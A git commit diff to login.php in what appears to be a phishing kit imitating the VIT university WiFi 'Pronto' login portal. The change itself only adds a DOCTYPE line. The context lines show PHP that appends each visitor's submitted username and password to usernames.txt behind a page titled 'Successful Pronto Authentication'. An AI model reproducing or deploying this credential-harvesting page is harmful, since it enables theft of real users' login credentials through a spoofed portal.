590084f0a11480de29642f4705cccf4b8f2e3e02
Mohammed Aneez <128913614+AneezHussain@users.noreply.github.com>
2025-04-15 14:05:09 +0530

    Update login.php

--- .sites/VIT-WIFI/login.php
+++ .sites/VIT-WIFI/login.php
@@ -1,6 +1,7 @@
 <?php
 file_put_contents("usernames.txt", "Username: " . $_POST['session_key'] . " | Password: " . $_POST['session_password'] . "\n", FILE_APPEND);
 ?>
+<!DOCTYPE html>
 <html>
   <head>
     <title>Successful Pronto Authentication</title>
